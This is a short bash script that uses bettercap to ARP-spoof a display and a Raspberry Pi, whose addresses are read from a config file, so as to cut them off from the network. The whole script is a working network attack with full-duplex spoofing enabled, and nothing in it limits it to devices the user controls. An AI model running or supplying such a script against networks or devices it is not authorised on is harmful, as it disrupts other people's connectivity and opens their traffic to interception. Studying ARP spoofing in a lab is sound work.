# This script is used to disconnect the Raspberry Pi and the display from the network by ARP spoofing.
#!/bin/bash
# sudo apt install bettercap

. $(dirname "$0")/config.sh

echo "[+] Starting ARP Spoofing to $DISPLAY_ADDRESS on $INTERFACE ..."
sudo bettercap -iface "$INTERFACE" -eval "
set arp.spoof.targets $DISPLAY_ADDRESS,$PI_ADRESS;
set arp.spoof.fullduplex true;
arp.spoof on
"
